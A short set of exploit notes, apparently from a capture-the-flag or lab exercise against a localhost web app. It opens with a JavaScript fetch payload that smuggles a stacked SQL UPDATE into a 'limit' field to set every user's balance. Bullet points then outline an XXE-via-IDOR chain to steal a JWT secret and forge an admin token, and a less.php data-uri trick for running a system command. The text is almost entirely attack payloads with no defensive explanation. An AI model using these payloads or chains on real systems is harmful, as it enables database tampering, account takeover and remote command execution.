```
await fetch("http://localhost/api/orders/search", {
  "headers": {
    "content-type": "application/json",
  },
  "body": JSON.stringify({
      "query": "",
      "status": "all",
      "sort": "id_asc",
      "page": 1,
      "limit": `100; UPDATE users SET balance = 10000000.00; --`,
  }),
  "method": "POST",
}).then(res => res.text());
```
- XXE via IDOR to exfiltrate JWT secret and forge admin token
- 0day in less.php library, first create a import dir with system and after generate this css :
```
.test { 
    content: data-uri('id'); 
}
```
